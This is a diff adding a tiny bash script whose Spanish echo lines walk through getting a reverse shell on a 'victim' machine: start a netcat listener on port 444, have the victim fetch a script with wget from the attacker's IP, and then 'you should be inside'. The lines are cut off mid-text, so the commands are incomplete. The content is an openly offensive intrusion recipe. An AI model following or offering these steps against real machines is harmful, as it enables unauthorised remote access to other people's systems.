@@ -1,0 +1,8 @@
+#!/bin/bash
+echo "sorpresa.sh es script para ejec reverse shell en vi>
+
+echo "escribe el comando nc -lvnp 444 para escuchar a la >
+
+echo "Escribe en la de la victima wget -q0- http://(ip tu>
+
+echo "Deberias estar dentro"
